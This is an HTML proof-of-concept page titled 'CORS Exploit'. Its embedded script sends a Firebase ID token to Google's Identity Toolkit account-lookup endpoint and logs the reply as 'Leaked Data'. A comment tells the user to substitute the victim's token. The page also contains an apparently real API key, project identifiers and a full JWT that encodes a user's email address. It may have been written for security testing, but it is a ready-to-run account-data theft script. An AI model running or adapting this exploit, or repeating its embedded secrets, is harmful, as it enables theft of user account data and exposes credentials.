<html>
<head>
  <title>CORS Exploit</title>
</head>
<body>
  <h1>Testing CORS Misconfiguration</h1>
  <script>
    fetch('https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=AIzaSyC7J-OjmaQ6igkRmD5KNq2ZjbBDNgVNcIg', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Client-Version': 'Firefox/JsCore/9.23.0/FirebaseCore-web',
        'X-Firebase-Gmpid': '1:23092714539:web:301a575dc5381b26689e6e',
      },
      body: JSON.stringify({
        idToken: "eyJhbGciOiJSUzI1NiIsImtpZCI6IjkyODg2OGRjNDRlYTZhOThjODhiMzkzZDM2NDQ1MTM2NWViYjMwZDgiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vcm9ib3NoYWRvdy1uZXR3b3JrLXNjYW5uZXIiLCJhdWQiOiJyb2Jvc2hhZG93LW5ldHdvcmstc2Nhbm5lciIsImF1dGhfdGltZSI6MTczMjIwMTc2NywidXNlcl9pZCI6InFUc3JBbnc2SU1nR1FETEJobzFHUmM2Wnk2ODMiLCJzdWIiOiJxVHNyQW53NklNZ0dRRExCaG8xR1JjNlp5NjgzIiwiaWF0IjoxNzMyMjAxNzY3LCJleHAiOjE3MzIyMDUzNjcsImVtYWlsIjoibW1tQHJvYm9zaGFkb3cuY29tIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7ImVtYWlsIjpbIm1tbUByb2Jvc2hhZG93LmNvbSJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.fJaq3W6Cwhm08SdD7gMmSfPNY15P35LRDh53ar6gNSCbMDFHm4nIuOA_LYg0G-QWz1U4SWm_CoGdqLbll0S5DMvC3gfuYbM2HDnrQuqG6dDAPErNAU_nAojvRA53DHNyJpKNhoRE_cAdwczJ2uveXC8gf7F7-AmE_GSPFcy1mCCqhTWtuO_k57CT5ioqIiKFJWpqR6MnbADw2x-FKjriQoZsc3odsi6_KPJXjHFNbAxqH7wmPcJY1y1bFBCnehTyk88nn3C9yURaUpZJ7oZTWRZcJwyfZ9i7R8xqih70Saj9gEi6d3ocQI-n72GLVBW2Tto_0RPquwoKrBk7Go_uhQ" // Replace with a valid token of the victim
      }),
    })
      .then(response => response.json())
      .then(data => console.log('Leaked Data:', data))
      .catch(error => console.error('Error:', error));
  </script>
</body>
</html>
